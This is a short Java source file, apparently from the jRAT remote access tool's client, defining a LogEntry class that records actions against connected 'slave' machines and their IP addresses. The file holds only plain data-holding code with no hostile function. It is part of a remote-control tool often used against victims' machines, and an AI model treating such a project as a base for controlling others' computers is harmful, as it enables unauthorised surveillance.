package su.jrat.client;

import su.jrat.client.utils.Utils;

public class LogEntry {

	private String action;
	private AbstractSlave slave;
	private String info;
	private String date;

	public LogEntry(String action, AbstractSlave abstractSlave, String info) {
		this.action = action;
		this.slave = abstractSlave;
		this.info = info;
		this.date = Utils.getDate();
	}

	public String getDate() {
		return date;
	}

	public String getAction() {
		return action;
	}

	public AbstractSlave getSlave() {
		return slave;
	}

	public String getInfo() {
		return info;
	}

	public Object[] getDisplayData() {
		return new Object[] { action, slave == null ? "" : slave.getIP(), info, date };
	}

}
